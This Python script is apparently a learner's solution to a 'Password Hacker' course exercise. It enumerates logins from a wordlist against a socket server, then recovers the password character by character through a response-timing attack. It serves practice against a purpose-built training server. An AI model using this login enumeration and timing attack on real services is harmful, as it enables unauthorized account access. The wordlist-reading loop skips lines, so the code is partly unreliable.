import sys
import socket
import itertools
import json
from datetime import datetime
from datetime import timedelta
pword_dictionary = []
login_dict = []
alphabet = 'abcdefghijklmnopqrstuvwxyz0123456789'

with open('C:\\Users\\User\\PycharmProjects\\Password Hacker1\\Password Hacker\\task\\hacking\\passwords.txt', 'r', encoding='utf-8') as pwords:
    for line in pwords:
        pword_dictionary.append(pwords.readline().rstrip('\n'))

with open('C:\\Users\\User\\PycharmProjects\\Password Hacker1\\Password Hacker\\task\\hacking\\logins.txt', 'r', encoding='utf-8') as loginss:
    for line in loginss:
        login_dict.append(line.rstrip('\n'))


def casing(word):
    permutations = map(''.join, (itertools.product(*zip(word.lower(), word.upper()))))
    return permutations


def guess_login():
    for login in login_dict:
        json_string = json.dumps({"login": login, "password": " "})
        data = json_string.encode(encoding='utf-8')
        client_socket.send(data)
        response = client_socket.recv(1024)
        response = response.decode(encoding='utf-8')
        if response == json.dumps({"result": "Wrong password!"}):
            return login


def guess_password(correct_log):
    password_try = []
    while True:
        for char in alphabet:
            password_try.append(char)
            data = json.dumps({"login": correct_log, "password": ''.join(password_try)})
            data = data.encode(encoding='utf-8')
            start = datetime.now()
            client_socket.send(data)
            response = client_socket.recv(1024)
            response = response.decode(encoding='utf-8')
            finish = datetime.now()
            difference = (finish - start).total_seconds()
            if difference >= 0.1:
                continue
            elif response == json.dumps({"result": "Wrong password!"}):
                password_try.pop()
                continue
            elif response == json.dumps({"result": "Connection success!"}):
                password = ''.join(password_try)
                return password
        for char in alphabet.upper():
            password_try.append(char)
            data = json.dumps({"login": correct_log, "password": ''.join(password_try)})
            data = data.encode(encoding='utf-8')
            start = datetime.now()
            client_socket.send(data)
            response = client_socket.recv(1024)
            response = response.decode(encoding='utf-8')
            finish = datetime.now()
            difference = (finish - start).total_seconds()
            if difference >= 0.1:
                continue
            elif response == json.dumps({"result": "Wrong password!"}):
                password_try.pop()
                continue
            elif response == json.dumps({"result": "Connection success!"}):
                password = ''.join(password_try)
                return password


args = sys.argv
ip_address = args[1]
port = args[2]
with socket.socket() as client_socket:
    hostname = ip_address
    address = (hostname, int(port))
    client_socket.connect(address)
    correct_login = guess_login()
    correct_password = guess_password(correct_login)
    print(json.dumps({"login": correct_login, "password": correct_password}))
    client_socket.close()
